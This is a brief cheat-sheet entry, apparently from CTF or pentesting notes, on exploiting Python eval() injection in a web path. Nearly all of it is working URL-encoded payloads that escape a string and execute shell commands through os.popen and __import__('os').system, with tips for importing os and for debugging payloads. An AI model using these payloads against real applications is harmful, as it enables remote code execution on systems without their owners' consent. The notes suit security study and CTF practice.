### Eval used?:
`/hello/"%2bos.popen('ls').read()%2b"`  
_what if there is no system module??_    We IMPORT it :D    **__import__('os').system('ls')**  
`hello/ddd"%2bstr(__import__('os').system('ls'))%2b"`
If you are grappling with erros, try t run your commands in a python terminal and see if it works
